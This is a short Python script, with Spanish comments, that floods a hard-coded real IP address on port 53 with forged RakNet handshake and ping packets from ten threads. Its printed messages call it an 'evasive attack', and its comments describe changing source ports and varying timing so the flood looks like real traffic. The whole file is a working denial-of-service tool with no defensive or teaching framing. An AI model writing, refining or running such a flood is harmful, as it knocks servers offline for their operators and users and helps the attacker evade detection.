import struct
import socket
import time
import threading
import random

ip = "46.105.222.228"
port = 53
duration = 32
threads = 10

magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
protocol_versions = [10, 11, 12, 13, 14, 15, 16]

def random_guid():
    return random.getrandbits(64)

def build_unconnected_ping(guid):
    packet_id = 0x01
    timestamp = int(time.time() * 1000)
    packet = struct.pack('!B', packet_id)
    packet += struct.pack('>Q', timestamp)
    packet += magic
    packet += struct.pack('>Q', guid)
    return packet

def build_open_conn_req_1(protocol_version, guid):
    packet_id = 0x05
    packet = struct.pack('!B', packet_id)
    packet += magic
    packet += struct.pack('!B', protocol_version)
    packet += struct.pack('>Q', guid)
    return packet

def build_open_conn_req_2(port, mtu, guid):
    packet_id = 0x07
    magic_local = magic
    client_address = socket.inet_aton("0.0.0.0")
    client_port = struct.pack('>H', random.randint(1024, 65535))
    mtu_size = struct.pack('>H', mtu)
    packet = struct.pack('!B', packet_id)
    packet += magic_local
    packet += client_address
    packet += client_port
    packet += mtu_size
    packet += struct.pack('>Q', guid)
    return packet

def attack_thread(ip, port, end_time):
    sent = 0
    guid = random_guid()
    protocol_version = random.choice(protocol_versions)
    mtu = random.choice([1400, 1450, 1492, 1500, 1300])
    while time.time() < end_time:
        # Re-crear socket para cambiar puerto fuente
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        guid = random_guid()
        protocol_version = random.choice(protocol_versions)
        mtu = random.choice([1400, 1450, 1492, 1500, 1300])
        ptype = random.choice(['ping', 'req1', 'req2'])
        if ptype == 'ping':
            packet = build_unconnected_ping(guid)
        elif ptype == 'req1':
            packet = build_open_conn_req_1(protocol_version, guid)
        else:
            packet = build_open_conn_req_2(port, mtu, guid)
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
        except Exception:
            pass
        # Simula tráfico real variando el ritmo
        time.sleep(random.uniform(0.01, 0.2))
        sock.close()
    return sent

def run_attack(ip, port, duration, threads):
    print(f"Iniciando ataque evasivo RakNet a {ip}:{port} durante {duration}s con {threads} hilos...")
    end_time = time.time() + duration
    thread_list = []
    sent_total = [0] * threads

    def thread_func(idx):
        sent_total[idx] = attack_thread(ip, port, end_time)

    for i in range(threads):
        t = threading.Thread(target=thread_func, args=(i,))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print(f"Ataque finalizado. Paquetes enviados: {sum(sent_total)}")

if __name__ == "__main__":
    run_attack(ip, port, duration, threads)
